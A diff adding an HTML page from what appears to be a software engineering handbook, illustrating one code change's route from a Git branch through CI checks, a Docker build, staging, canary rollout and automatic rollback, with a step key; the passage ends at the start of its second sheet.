@@ -1,0 +1,1534 @@
+<meta charset="utf-8">
+<title>Atlas of Delivery — seven sheets</title>
+
+<style>
+  :root{
+    --paper:#FBFAF7; --ink:#121A22; --mute:#6A7A7D; --rule:#D4D8D4; --band:#F1F0EC;
+    --line:#0B6E6E; --fast:#A9761A; --hazard:#9E2A2B; --cool:#3C6E8F; --learn:#5B4B8A;
+    --z1:#E2EDEE; --z2:#E6EBEC; --z3:#EDEBE6; --z4:#F2E9DF; --z5:#F6E4D4; --z6:#EAE6F1;
+    --sans:"Helvetica Neue",Helvetica,Arial,"Liberation Sans",sans-serif;
+    --serif:Georgia,"Iowan Old Style","Times New Roman",serif;
+    --mono:ui-monospace,"SF Mono","Cascadia Mono",Consolas,"Liberation Mono",monospace;
+  }
+  @media (prefers-color-scheme:dark){
+    :root:not([data-theme="light"]){
+      --paper:#0E1418; --ink:#E8E6E0; --mute:#8B9A9C; --rule:#28312F; --band:#161C1E;
+      --line:#3FB5B0; --fast:#D2A24C; --hazard:#E0696A; --cool:#7FAECB; --learn:#A79BD0;
+      --z1:#16232A; --z2:#1A2426; --z3:#212422; --z4:#28241E; --z5:#30251C; --z6:#221F2C;
+    }
+  }
+  :root[data-theme="dark"]{
+    --paper:#0E1418; --ink:#E8E6E0; --mute:#8B9A9C; --rule:#28312F; --band:#161C1E;
+    --line:#3FB5B0; --fast:#D2A24C; --hazard:#E0696A; --cool:#7FAECB; --learn:#A79BD0;
+    --z1:#16232A; --z2:#1A2426; --z3:#212422; --z4:#28241E; --z5:#30251C; --z6:#221F2C;
+  }
+  :root[data-theme="light"]{
+    --paper:#FBFAF7; --ink:#121A22; --mute:#6A7A7D; --rule:#D4D8D4; --band:#F1F0EC;
+    --line:#0B6E6E; --fast:#A9761A; --hazard:#9E2A2B; --cool:#3C6E8F; --learn:#5B4B8A;
+    --z1:#E2EDEE; --z2:#E6EBEC; --z3:#EDEBE6; --z4:#F2E9DF; --z5:#F6E4D4; --z6:#EAE6F1;
+  }
+
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--paper);color:var(--ink);font-family:var(--serif);font-size:15px;line-height:1.55;-webkit-font-smoothing:antialiased}
+  .atlas{max-width:1500px;margin:0 auto;padding:38px 26px 80px;display:flex;flex-direction:column;gap:0}
+
+  .sheet{display:flex;flex-direction:column;gap:26px;padding:44px 0 56px;border-top:1px solid var(--rule)}
+  .sheet:first-of-type{border-top:0;padding-top:0}
+
+  .plate{display:flex;flex-wrap:wrap;align-items:baseline;gap:8px 20px;border-bottom:3px solid var(--ink);padding-bottom:12px}
+  .plate .no{font-family:var(--mono);font-size:12px;letter-spacing:.14em;color:var(--line);text-transform:uppercase}
+  .plate h2{font-family:var(--sans);font-weight:700;font-size:clamp(24px,3.4vw,40px);letter-spacing:-.02em;margin:0;line-height:1;text-wrap:balance}
+  .plate .form{font-family:var(--sans);font-size:11px;font-weight:700;letter-spacing:.17em;text-transform:uppercase;color:var(--fast);margin-left:auto}
+  .plate .cov{font-family:var(--mono);font-size:11px;color:var(--mute);width:100%}
+
+  .thesis{max-width:74ch;margin:0;font-size:16.5px}
+  .thesis strong{font-weight:400;box-shadow:inset 0 -.42em 0 color-mix(in srgb,var(--fast) 26%,transparent)}
+
+  figure{margin:0;display:flex;flex-direction:column;gap:11px}
+  .scroll{overflow-x:auto;overflow-y:hidden;padding-bottom:4px}
+  svg{display:block;width:100%;height:auto}
+  .scroll > svg{min-width:880px}
+  .scroll > svg.wide{min-width:1180px}
+  figcaption{font-size:13.5px;color:var(--mute);max-width:86ch}
+  figcaption b{color:var(--ink);font-weight:400}
+
+  .s-name{font-family:var(--sans);font-size:13px;font-weight:700;fill:var(--ink)}
+  .s-sub{font-family:var(--sans);font-size:11px;fill:var(--mute)}
+  .s-num{font-family:var(--mono);font-size:10.5px;fill:var(--mute)}
+  .s-mono{font-family:var(--mono);font-size:11px;fill:var(--ink)}
+  .s-zone{font-family:var(--sans);font-size:11px;font-weight:700;letter-spacing:.19em;text-transform:uppercase}
+  .s-note{font-family:var(--sans);font-size:11.5px;font-weight:700;fill:var(--fast)}
+  .s-haz{font-family:var(--sans);font-size:11.5px;font-weight:700;fill:var(--hazard)}
+  .s-learn{font-family:var(--sans);font-size:11.5px;font-weight:700;fill:var(--learn)}
+  .s-lab{font-family:var(--sans);font-size:12px;font-weight:700;fill:var(--ink)}
+  .s-big{font-family:var(--sans);font-size:15px;font-weight:700;fill:var(--ink)}
+  .st{fill:var(--paper);stroke:var(--line);stroke-width:3}
+
+  .gaz{border-top:2px solid var(--ink);padding-top:16px;display:flex;flex-direction:column;gap:12px}
+  .gaz > h3{font-family:var(--sans);font-size:11px;letter-spacing:.17em;text-transform:uppercase;margin:0;color:var(--mute);font-weight:700}
+  .gazgrid{display:grid;grid-template-columns:repeat(auto-fit,minmax(268px,1fr));gap:0;border:1px solid var(--rule);border-bottom:0}
+  .gazgrid > div{border-bottom:1px solid var(--rule);border-right:1px solid var(--rule);padding:12px 15px}
+  .gazgrid h4{font-family:var(--sans);font-size:11px;letter-spacing:.11em;text-transform:uppercase;margin:0 0 5px;font-weight:700;color:var(--line)}
+  .gazgrid h4 span{font-family:var(--mono);color:var(--fast);margin-right:7px;letter-spacing:0}
+  .gazgrid p{margin:0;font-size:12.5px;line-height:1.5}
+  .gazgrid p.n{font-family:var(--mono);font-size:11.5px;color:var(--ink);line-height:1.65}
+  .gazgrid p.w{color:var(--mute);margin-top:5px;font-size:12px}
+
+  .warn{border-left:4px solid var(--hazard);background:color-mix(in srgb,var(--hazard) 6%,transparent);padding:14px 18px;max-width:92ch}
+  .warn b{color:var(--hazard);font-family:var(--sans);font-size:13px}
+  .warn p{margin:4px 0 0}
+
+  .contents{display:grid;grid-template-columns:repeat(auto-fit,minmax(310px,1fr));gap:0;border:1px solid var(--rule);border-bottom:0}
+  .contents a{display:flex;gap:14px;padding:15px 17px;border-bottom:1px solid var(--rule);border-right:1px solid var(--rule);text-decoration:none;border-left:0;border-top:0;color:var(--ink);align-items:flex-start}
+  .contents a:hover{background:var(--band)}
+  .contents .n{font-family:var(--mono);font-size:12px;color:var(--line);min-width:2.2em}
+  .contents h4{font-family:var(--sans);font-size:14px;margin:0 0 3px;font-weight:700}
+  .contents p{margin:0;font-size:12.5px;color:var(--mute);line-height:1.45}
+  .contents em{font-style:normal;font-family:var(--sans);font-size:10px;letter-spacing:.13em;text-transform:uppercase;color:var(--fast);display:block;margin-top:4px}
+
+  h1{font-family:var(--sans);font-weight:700;font-size:clamp(32px,5.6vw,64px);letter-spacing:-.024em;line-height:.95;margin:0;text-wrap:balance}
+  h1 em{font-style:normal;color:var(--line)}
+  .eyebrow{font-family:var(--sans);font-size:11px;font-weight:700;letter-spacing:.22em;text-transform:uppercase;color:var(--line);margin:0}
+  .meta{display:flex;flex-wrap:wrap;gap:6px 26px;font-family:var(--mono);font-size:11.5px;color:var(--mute);border-top:1px solid var(--rule);padding-top:12px}
+  .meta b{color:var(--ink);font-weight:400}
+  a{color:var(--line)}
+  a:focus-visible{outline:2px solid var(--fast);outline-offset:3px}
+
+  @media (max-width:720px){.atlas{padding:22px 14px 50px}.plate .form{margin-left:0}}
+
+  @page{size:A2 landscape;margin:11mm}
+  @media print{
+    :root{
+      --paper:#fff;--ink:#111;--mute:#555;--rule:#c9c9c9;--band:#F2F1ED;
+      --line:#0B6E6E;--fast:#8F6212;--hazard:#8E1F20;--cool:#2F5A76;--learn:#4A3D75;
+      --z1:#E2EDEE;--z2:#E9EDEE;--z3:#EFEDE9;--z4:#F4EBE2;--z5:#F8E7D8;--z6:#EBE7F2;
+    }
+    body{-webkit-print-color-adjust:exact;print-color-adjust:exact;font-size:9.5pt}
+    .atlas{max-width:none;padding:0}
+    .sheet{break-before:page;border-top:0;padding:0 0 0;gap:16px}
+    .sheet:first-of-type{break-before:avoid}
+    .scroll{overflow:visible}
+    .scroll > svg,.scroll > svg.wide{min-width:0}
+    figure,.warn,.gazgrid > div,.contents a{break-inside:avoid}
+    .plate{break-after:avoid}
+  }
+</style>
+
+<div class="atlas">
+
+<!-- ══════════════════════ SHEET 0 — CONTENTS ══════════════════════ -->
+<div class="sheet">
+  <p class="eyebrow">Software Engineering Handbook · 13 DevOps and Delivery · seven sheets</p>
+  <h1>Atlas of <em>Delivery</em></h1>
+  <p class="thesis">One change, from a new branch on a laptop to a share of real traffic — and, when it goes wrong, back again. Sheet 1 is the route a commit actually travels; every other sheet magnifies one stretch of that route or the ground it lands on. <strong>None of it exists to make shipping fast. It exists to make every change small enough to review, identical everywhere it runs, and reversible in minutes — speed is what you get as a side effect.</strong></p>
+  <div class="meta">
+    <span><b>Print</b> A2 landscape · one sheet per page</span>
+    <span><b>Sheets</b> 7</span>
+    <span><b>Numbered steps</b> 119</span>
+    <span><b>Read first</b> Sheet 1 end to end, then Sheet 7 before you choose how to roll anything out</span>
+  </div>
+
+  <div class="contents">
+    <a href="#a1"><span class="n">1</span><span><h4>The Delivery Line</h4><p>A 60-line change to 100% of traffic: 18 stops, five zones, one loop back to the laptop and one emergency exit.</p><em>Transit diagram</em></span></a>
+    <a href="#a2"><span class="n">2</span><span><h4>The Graph Underneath</h4><p>What Git actually stores — snapshots, labels and a graph — and how to undo anything without guessing.</p><em>Exploded parts</em></span></a>
+    <a href="#a3"><span class="n">3</span><span><h4>The Checkpoint</h4><p>The pull request, the workflow and the trust boundary: where GitHub decides what may reach main, and the cloud.</p><em>Floor plan</em></span></a>
+    <a href="#a4"><span class="n">4</span><span><h4>The Sealed Box</h4><p>How an image is layered, slimmed and run on a shared kernel — and how Compose starts a whole stack with one command.</p><em>Cutaway section</em></span></a>
+    <a href="#a5"><span class="n">5</span><span><h4>The Thermostat</h4><p>Kubernetes as one reconciliation loop: declared state, controllers, limits, probes and an open network.</p><em>Control loop</em></span></a>
+    <a href="#a6"><span class="n">6</span><span><h4>Blueprint and Inventory</h4><p>Terraform's code, state and reality; Ansible's idempotent interior. Infrastructure that plans before it acts.</p><em>Process plant</em></span></a>
+    <a href="#a7"><span class="n">7</span><span><h4>Crossing the River</h4><p>Choosing a rollout, judging a canary, and the database migration that cannot roll back.</p><em>Decision tree</em></span></a>
+  </div>
+
+  <figure>
+    <div class="scroll">
+      <svg viewBox="0 0 1400 300" role="img" aria-label="How the seven sheets fit together. Sheet 1, the delivery line, runs across the middle as the route one change takes from a branch to production. Above it, sheet 2 magnifies the Git stops, sheet 3 the pull request stops, sheet 4 the artefact the line produces, and sheet 7 the rollout at the end. Below it, sheet 6 builds the infrastructure everything lands on and sheet 5 is the cluster that runs what the line deploys. A band underneath marks monitoring and rollback, which close the loop back to the next commit.">
+        <rect x="30" y="118" width="1340" height="62" fill="var(--z3)"/>
+        <text x="46" y="144" class="s-zone" fill="var(--mute)">Sheet 1 — the route one change takes, from git switch -c to 100% of traffic</text>
+        <text x="46" y="164" class="s-sub">every other sheet is a magnification of a stretch of this line, or the ground that the line delivers onto</text>
+
+        <g stroke="var(--line)" stroke-width="2" fill="none">
+          <path d="M250,118 L250,80"/><path d="M620,118 L620,80"/><path d="M960,118 L960,80"/><path d="M1240,118 L1240,80"/>
+          <path d="M520,180 L520,216"/><path d="M1050,180 L1050,216"/>
+        </g>
+        <g class="s-lab" text-anchor="middle">
+          <text x="250" y="68">2 · the graph underneath</text>
+          <text x="620" y="68">3 · the checkpoint</text>
+          <text x="960" y="68">4 · the sealed box</text>
+          <text x="1240" y="68">7 · crossing the river</text>
+          <text x="520" y="234">6 · blueprint and inventory</text>
+          <text x="1050" y="234">5 · the thermostat</text>
+        </g>
+        <g class="s-sub" text-anchor="middle">
+          <text x="250" y="50">stops 01 to 04, magnified</text>
+          <text x="620" y="50">stops 05 to 08, magnified</text>
+          <text x="960" y="50">what stops 09 and 10 produce</text>
+          <text x="1240" y="50">stops 13 and 14, and exit B</text>
+          <text x="520" y="252">builds the ground: networks, databases, machines</text>
+          <text x="1050" y="252">runs, heals and scales what the line deploys</text>
+        </g>
+        <rect x="30" y="276" width="1340" height="10" fill="color-mix(in srgb,var(--fast) 26%,transparent)"/>
+        <text x="1370" y="270" text-anchor="end" class="s-note">Monitoring and rollback run under every sheet — they are what make the next change safe to send</text>
+      </svg>
+    </div>
+    <figcaption>Read it as a line and its ground. <b>The line</b> — sheets 1 to 4 and 7 — moves one change, many times a day, in minutes. <b>The ground</b> — sheets 5 and 6 — changes rarely, but through exactly the same pull-request route, never by clicking in a console. Teams get into trouble when they treat the ground as something outside the line.</figcaption>
+  </figure>
+</div>
+
+<!-- ══════════════════════ SHEET 1 — THE DELIVERY LINE ══════════════════════ -->
+<div class="sheet" id="a1">
+  <div class="plate">
+    <span class="no">Sheet 1</span>
+    <h2>The Delivery Line</h2>
+    <span class="form">Transit diagram</span>
+    <span class="cov">Covers · CI CD · Git · GitHub · GitHub Actions · Docker · Deployment Strategies</span>
+  </div>
+  <p class="thesis">One 60-line change, fourteen stops out and five back. Git, GitHub, Actions, Docker and the rollout are each a few stations on the same line. <strong>The orange ring at stop 06 sends a change back in 25 seconds; the red ring at stop 13 undoes it in 90. Everything between them exists so that those two numbers stay small.</strong></p>
+
+  <figure>
+    <div class="scroll">
+      <svg class="wide" viewBox="0 0 2160 800" role="img" aria-label="A transit map of one code change. Fourteen numbered outbound stations run left to right through five zones: your laptop, the pull request, the artefact, staging and production. A fast loop runs back from station 6, the fast checks, to station 3, because a failed lint sends the change back to the laptop in seconds. A dashed inset below station 7 shows the Compose integration harness: up with wait, migrate, test, down. A dashed red exit drops from station 13, the canary, straight to the return line: automatic rollback. A dashed box below station 14 explains that the feature ships dark behind a flag. The return line runs right to left through stations 15 to 18: release by flag, watch the metrics, the deployment record, and the next commit.">
+        <defs>
+          <marker id="p1" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="var(--line)"/></marker>
+          <marker id="p2" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="var(--fast)"/></marker>
+          <marker id="p3" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="var(--hazard)"/></marker>
+        </defs>
+
+        <text x="30" y="60" class="s-zone" fill="var(--line)">One change · a 60-line pull request, from a new branch to all of production, in one working day</text>
+        <text x="30" y="82" class="s-sub">Circles are ordinary stops. The square is the artefact, built once. Orange rings are gates that send the change back; the red ring is where production can undo it without a human.</text>
+
+        <rect x="30" y="150" width="570" height="250" fill="var(--z1)"/>
+        <rect x="600" y="150" width="540" height="250" fill="var(--z2)"/>
+        <rect x="1140" y="150" width="310" height="250" fill="var(--z3)"/>
+        <rect x="1450" y="150" width="190" height="250" fill="var(--z4)"/>
+        <rect x="1640" y="150" width="490" height="250" fill="var(--z5)"/>
+        <g class="s-zone" fill="var(--mute)">
+          <text x="42" y="172">Your laptop · Git</text><text x="612" y="172">The pull request</text>
+          <text x="1152" y="172">The artefact</text><text x="1462" y="172">Staging</text>
+          <text x="1652" y="172">Production</text>
+        </g>
+        <g stroke="var(--rule)" stroke-width="1">
+          <line x1="600" y1="150" x2="600" y2="400"/><line x1="1140" y1="150" x2="1140" y2="400"/>
+          <line x1="1450" y1="150" x2="1450" y2="400"/><line x1="1640" y1="150" x2="1640" y2="400"/>
+        </g>
+
+        <line x1="70" y1="290" x2="2070" y2="290" stroke="var(--line)" stroke-width="7"/>
+        <line x1="70" y1="273" x2="70" y2="307" stroke="var(--line)" stroke-width="7"/>
+        <path d="M2070,290 C2124,290 2124,700 2070,700" fill="none" stroke="var(--line)" stroke-width="7"/>
+        <line x1="2070" y1="700" x2="82" y2="700" stroke="var(--line)" stroke-width="7" marker-end="url(#p1)"/>
+
+        <g class="st"><circle cx="90" cy="290" r="9"/><circle cx="240" cy="290" r="9"/><circle cx="390" cy="290" r="9"/><circle cx="530" cy="290" r="9"/><circle cx="660" cy="290" r="9"/><circle cx="940" cy="290" r="9"/><circle cx="1080" cy="290" r="9"/><circle cx="1340" cy="290" r="9"/><circle cx="1510" cy="290" r="9"/><circle cx="1700" cy="290" r="9"/><circle cx="2000" cy="290" r="9"/></g>
+        <circle cx="800" cy="290" r="13" fill="var(--paper)" stroke="var(--fast)" stroke-width="3.5"/>
+        <circle cx="1850" cy="290" r="13" fill="var(--paper)" stroke="var(--hazard)" stroke-width="3.5"/>
+        <rect x="1170" y="272" width="60" height="36" rx="4" fill="var(--paper)" stroke="var(--line)" stroke-width="3.5"/>
+        <g stroke="var(--line)" stroke-width="1.5" fill="none"><path d="M1178,282 h44"/><path d="M1178,290 h44"/><path d="M1178,298 h44"/></g>
+
+        <g class="s-num">
+          <text x="44" y="206">01</text><text x="194" y="206">02</text><text x="344" y="206">03</text><text x="484" y="206">04</text><text x="614" y="206">05</text><text x="754" y="206">06</text><text x="894" y="206">07</text><text x="1034" y="206">08</text><text x="1154" y="206">09</text><text x="1294" y="206">10</text><text x="1464" y="206">11</text><text x="1654" y="206">12</text><text x="1804" y="206">13</text><text x="1954" y="206">14</text>
+        </g>
+        <g class="s-lab">
+          <text x="44" y="224">new branch</text><text x="194" y="224">stage hunks</text><text x="344" y="224">commit</text><text x="484" y="224">rebase, push</text><text x="614" y="224">pull request</text><text x="754" y="224">fast checks</text><text x="894" y="224">parallel jobs</text><text x="1034" y="224">review, merge</text><text x="1154" y="224">build once</text><text x="1294" y="224">scan and sign</text><text x="1464" y="224">staging</text><text x="1654" y="224">approve</text><text x="1804" y="224">canary 5%</text><text x="1954" y="224">promote</text>
+        </g>
+        <g class="s-sub">
+          <text x="44" y="242">git switch -c:</text><text x="44" y="256">a new 40-byte label</text>
+          <text x="194" y="242">git add -p: only</text><text x="194" y="256">the coherent hunks</text>
+          <text x="344" y="242">a new snapshot;</text><text x="344" y="256">the label moves</text>
+          <text x="484" y="242">onto origin/main,</text><text x="484" y="256">--force-with-lease</text>
+          <text x="614" y="242">template: what, why,</text><text x="614" y="256">how it was verified</text>
+          <text x="754" y="242">lint + type check,</text><text x="754" y="256">fails in 25 s</text>
+          <text x="894" y="242">unit ×4 shards, scan,</text><text x="894" y="256">green in 4 min</text>
+          <text x="1034" y="242">CODEOWNERS review,</text><text x="1034" y="256">squash into main</text>
+          <text x="1154" y="242">multi-stage, non-root,</text><text x="1154" y="256">image:&lt;sha&gt;</text>
+          <text x="1294" y="242">Trivy fails criticals;</text><text x="1294" y="256">signed, pushed to GHCR</text>
+          <text x="1464" y="242">auto-deploy, then</text><text x="1464" y="256">smoke tests, same bytes</text>
+          <text x="1654" y="242">required reviewer,</text><text x="1654" y="256">OIDC → 1-hour role</text>
+          <text x="1804" y="242">one pod, 5% of traffic,</text><text x="1804" y="256">N+1 judged against N</text>
+          <text x="1954" y="242">25 → 50 → 100%;</text><text x="1954" y="256">old pods drained</text>
+        </g>
+
+        <!-- LOOP A -->
+        <path d="M800,306 C800,420 390,420 390,303" fill="none" stroke="var(--fast)" stroke-width="3.5" stroke-dasharray="9 7" marker-end="url(#p2)"/>
+        <circle cx="595" cy="391" r="12.5" fill="var(--paper)" stroke="var(--fast)" stroke-width="3"/>
+        <text x="595" y="395" text-anchor="middle" class="s-note" font-size="12">A</text>
+        <text x="595" y="430" text-anchor="middle" class="s-note">a red check sends the change back to stop 03</text>
+        <text x="595" y="446" text-anchor="middle" class="s-sub" style="fill:var(--fast)">25 seconds to learn it — not eight minutes into a build.</text>
+        <text x="595" y="460" text-anchor="middle" class="s-sub" style="fill:var(--fast)">The cheapest stages run first, and the line stops on a defect.</text>
+
+        <!-- COMPOSE INSET -->
+        <rect x="860" y="470" width="540" height="166" fill="var(--band)" stroke="var(--line)" stroke-width="2" stroke-dasharray="7 6"/>
+        <path d="M940,303 L940,470" fill="none" stroke="var(--line)" stroke-width="2.5" stroke-dasharray="6 5"/>
+        <text x="874" y="492" class="s-zone" fill="var(--line)">Inside stop 07 · the integration harness</text>
+        <text x="874" y="510" class="s-sub">the same compose.yaml developers run locally — sheet 4</text>
+        <line x1="920" y1="570" x2="1280" y2="570" stroke="var(--line)" stroke-width="4"/>
+        <g class="st" stroke-width="2.5"><circle cx="920" cy="570" r="7"/><circle cx="1040" cy="570" r="7"/><circle cx="1160" cy="570" r="7"/><circle cx="1280" cy="570" r="7"/></g>
+        <g class="s-num"><text x="900" y="540">C1</text><text x="1020" y="540">C2</text><text x="1140" y="540">C3</text><text x="1260" y="540">C4</text></g>
+        <g class="s-lab" font-size="11"><text x="900" y="556">up --wait</text><text x="1020" y="556">migrate</text><text x="1140" y="556">npm test</text><text x="1260" y="556">down -v</text></g>
+        <g class="s-sub" font-size="10.5">
+          <text x="900" y="592">blocks until every</text><text x="900" y="605">health check passes</text>
+          <text x="1020" y="592">an explicit step,</text><text x="1020" y="605">never on boot</text>
+          <text x="1140" y="592">real Postgres and</text><text x="1140" y="605">Redis, not mocks</text>
+          <text x="1260" y="592">nothing left</text><text x="1260" y="605">behind</text>
+        </g>
+        <text x="874" y="626" class="s-sub" font-size="10.5" style="fill:var(--hazard)">no sleep 15 — too slow on a good day and too short on a bad one</text>
+
+        <!-- EXIT B -->
+        <path d="M1850,305 L1850,694" fill="none" stroke="var(--hazard)" stroke-width="3.5" stroke-dasharray="9 7" marker-end="url(#p3)"/>
+        <circle cx="1850" cy="560" r="12.5" fill="var(--paper)" stroke="var(--hazard)" stroke-width="3"/>
+        <text x="1850" y="564" text-anchor="middle" class="s-haz" font-size="12">B</text>
+        <text x="1830" y="536" text-anchor="end" class="s-haz">automatic rollback</text>
+        <text x="1830" y="552" text-anchor="end" class="s-sub" style="fill:var(--hazard)">canary error rate 6× the stable version →</text>
+        <text x="1830" y="566" text-anchor="end" class="s-sub" style="fill:var(--hazard)">traffic back on N and the pod removed in 90 s.</text>
+        <text x="1830" y="580" text-anchor="end" class="s-sub" style="fill:var(--hazard)">Impact: 5% of traffic for 3 minutes. Nobody paged.</text>
+
+        <!-- FLAG BOX -->
+        <rect x="1880" y="450" width="250" height="176" fill="var(--z6)" stroke="var(--learn)" stroke-width="2" stroke-dasharray="7 6"/>
+        <path d="M2000,303 L2000,446" fill="none" stroke="var(--learn)" stroke-width="3" stroke-dasharray="8 6"/>
+        <text x="1894" y="474" class="s-learn">F · deploy is not release</text>
+        <text x="1894" y="494" class="s-sub">Stop 14 ships the feature dark,</text>
+        <text x="1894" y="508" class="s-sub">behind a flag. Turning it on is</text>
+        <text x="1894" y="522" class="s-sub">configuration, not a deployment:</text>
+        <text x="1894" y="536" class="s-sub">internal → 1% → 50% → everyone.</text>
+        <text x="1894" y="550" class="s-sub">Off again in seconds, no pipeline.</text>
+        <text x="1894" y="590" class="s-haz" font-size="10.5">An old flag is an untested</text>
+        <text x="1894" y="604" class="s-haz" font-size="10.5">hidden code path. Delete it.</text>
+
+        <!-- RETURN LINE -->
+        <g class="st"><circle cx="1560" cy="700" r="9"/><circle cx="1220" cy="700" r="9"/><circle cx="880" cy="700" r="9"/><circle cx="520" cy="700" r="9"/></g>
+        <line x1="90" y1="683" x2="90" y2="717" stroke="var(--line)" stroke-width="7"/>
+        <g class="s-num"><text x="1514" y="662">15</text><text x="1174" y="662">16</text><text x="834" y="662">17</text><text x="474" y="662">18</text></g>
+        <g class="s-lab"><text x="1514" y="680">release by flag</text><text x="1174" y="680">watch it</text><text x="834" y="680">the record</text><text x="474" y="680">the next commit</text><text x="110" y="680">live, and reversible</text></g>
+        <g class="s-sub">
+          <text x="1514" y="726">1% → 50% → everyone,</text><text x="1514" y="740">no deployment involved</text>
+          <text x="1174" y="726">error rate, p99 and</text><text x="1174" y="740">business metrics vs N</text>
+          <text x="834" y="726">which sha, deployed by</text><text x="834" y="740">whom, approved by whom</text>
+          <text x="474" y="726">lead time in hours;</text><text x="474" y="740">branches live a day</text>
+          <text x="110" y="726">a small change, shipped the</text><text x="110" y="740">same day, undoable in minutes</text>
+        </g>
+        <text x="2130" y="778" text-anchor="end" class="s-sub">Budget: fast checks under a minute, the whole pull-request pipeline under 10, the canary 10, a rollback 90 seconds. Past 20 minutes, people start batching their work.</text>
+      </svg>
+    </div>
+    <figcaption><b>Three things on this map surprise people.</b> The deploy tooling is four stops out of eighteen — most of the work is making the change small and the artefact identical. Stop 09 happens exactly once: staging and production run the same bytes with different environment variables. And the two rings are where the value lives: a defect caught at 06 costs 25 seconds, and one caught at 13 costs 5% of traffic for three minutes instead of everyone for an afternoon.</figcaption>
+  </figure>
+
+  <div class="gaz">
+    <h3>Step key — every stop on this sheet, and what it does</h3>
+    <div class="gazgrid">
+      <div><h4><span>01</span>New branch</h4><p>A branch is a 40-byte file holding one commit hash, so making one per task costs nothing. That one implementation detail is what made pull requests, review and CI on every change possible. Sheet 2.</p></div>
+      <div><h4><span>02</span>Stage hunks</h4><p>git add -p stages the coherent parts of your edits and leaves the rest. The index exists for exactly this, and it is the habit that produces commits a reviewer can follow.</p></div>
+      <div><h4><span>03</span>Commit</h4><p>An immutable snapshot identified by the hash of its content. The branch label moves to it; nothing old is edited. Loop A returns here when a check fails.</p></div>
+      <div><h4><span>04</span>Rebase, push</h4><p>Replay your unpushed commits onto the latest main (new hashes, safe because nobody else has them), then push with --force-with-lease, which refuses if someone else pushed in the meantime.</p></div>
+      <div><h4><span>05</span>Pull request</h4><p>The unit of collaboration: a proposed change with discussion, checks and review attached before it reaches main. A template asks what changed, why, and how it was verified. Sheet 3.</p></div>
+      <div><h4><span>06</span>Fast checks</h4><p>Lint, format and type check run first because they fail in seconds. Order every stage by how quickly it can prove you wrong; eight minutes of build before a formatting error wastes attention.</p></div>
+      <div><h4><span>07</span>Parallel jobs</h4><p>Unit tests sharded four ways with cached dependencies, dependency and secret scanning, integration tests — all on fresh runners at once. Caching plus a matrix routinely takes twenty minutes to five.</p></div>
+      <div><h4><span>08</span>Review, merge</h4><p>CODEOWNERS routes the review, one approval and green required checks unlock the merge, and a squash lands one clean commit on protected main. Small diffs are what make this stop quick.</p></div>
+      <div><h4><span>09</span>Build once</h4><p>The artefact is built a single time and tagged with the commit SHA. Rebuilding per environment means staging and production run different bytes, which is how "it worked in staging" happens. Sheet 4.</p></div>
+      <div><h4><span>10</span>Scan and sign</h4><p>Trivy fails the build on a critical CVE; cosign signs the image; it is pushed to the registry. Only what the pipeline built and signed should be allowed to run anywhere.</p></div>
+      <div><h4><span>11</span>Staging</h4><p>Deployed automatically with staging's environment variables — the image is unchanged. Smoke and end-to-end tests, the slow suite, run here rather than blocking every pull request.</p></div>
+      <div><h4><span>12</span>Approve</h4><p>The production environment waits for a required reviewer, then the job exchanges an OIDC token for a one-hour cloud role scoped to this repository and branch. No key is stored anywhere to leak.</p></div>
+      <div><h4><span>13</span>Canary 5%</h4><p>One new pod takes 5% of real traffic, and its error rate, p99 and business metrics are compared with the stable version over the same ten-minute window. Sheet 7.</p></div>
+      <div><h4><span>14</span>Promote</h4><p>Healthy, so traffic steps to 25%, 50%, then 100%. Old pods are drained: they stop accepting new connections, finish in-flight requests, and exit.</p></div>
+      <div><h4><span>A</span>The loop back</h4><p>A failed check returns the change to the laptop in seconds. The line stops on a defect instead of carrying it forward — a line that keeps running while producing defects only makes the problem larger.</p></div>
+      <div><h4><span>C1</span>up --wait</h4><p>docker compose up -d --wait blocks until every health check passes, which is what makes Compose usable in CI and removes the sleep 15.</p></div>
+      <div><h4><span>C2</span>Migrate</h4><p>Migrations run as an explicit step. Implicit migrations on container start race each other the moment a service is scaled beyond one instance.</p></div>
+      <div><h4><span>C3</span>Test against the real thing</h4><p>Integration tests hit real PostgreSQL and Redis from the same definition developers use locally, instead of mocks that agree with whatever the code assumes.</p></div>
+      <div><h4><span>C4</span>down -v</h4><p>Everything, volumes included, is torn down. The next run starts clean, so yesterday's data cannot make today's test pass.</p></div>
+      <div><h4><span>B</span>Automatic rollback</h4><p>Canary analysis fails, traffic returns to N, the canary is removed — no human decision in the loop. It is only possible because the previous image still exists and N+1 was backward compatible.</p></div>
+      <div><h4><span>F</span>Feature flag</h4><p>Deploy is a technical event; release is a business decision. A flag separates them, lets unfinished work live on the trunk, and is the only rollback that takes effect in seconds without a pipeline.</p></div>
+      <div><h4><span>15</span>Release by flag</h4><p>Product turns the feature on for internal users, then 1%, 50%, everyone. Nothing is deployed at any of those steps, so nothing can fail to deploy.</p></div>
+      <div><h4><span>16</span>Watch it</h4><p>Error rate, p99 latency and the business metrics that tests cannot see. An automated deployment is only as safe as the monitoring that would tell you it went wrong.</p></div>
+      <div><h4><span>17</span>The record</h4><p>The environment's history records which SHA was deployed, when, by which workflow and with whose approval. The running version is traceable to a reviewed commit.</p></div>
+      <div><h4><span>18</span>The next commit</h4><p>The measure of the whole line is how long a branch lives, in hours. Frequent small changes are the reason high-deploying teams also have the lowest change failure rate.</p></div>
+    </div>
+  </div>
+
+  <div class="warn">
+    <b>Two things quietly break this line</b>
+    <p>A test that fails 3% of the time teaches everyone to re-run stop 07 instead of reading it, until a real failure is re-run away — quarantine it the day it flakes, give it an owner, fix or delete it. And never automate stops 11 to 14 before exit B has been rehearsed in staging: without a tested rollback and monitoring, you have only automated the delivery of outages.</p>
+  </div>
+</div>
+
+<!-- ══════════════════════ SHEET 2 — THE GRAPH UNDERNEATH ══════════════════════ -->
+<div class="sheet" id="a2">
+  <div class="plate">
+    <span class="no">Sheet 2</span>
+    <h2>The Graph Underneath</h2>
+    <span class="form">Exploded parts</span>
+    <span class="cov">Covers · Git</span>
+  </div>
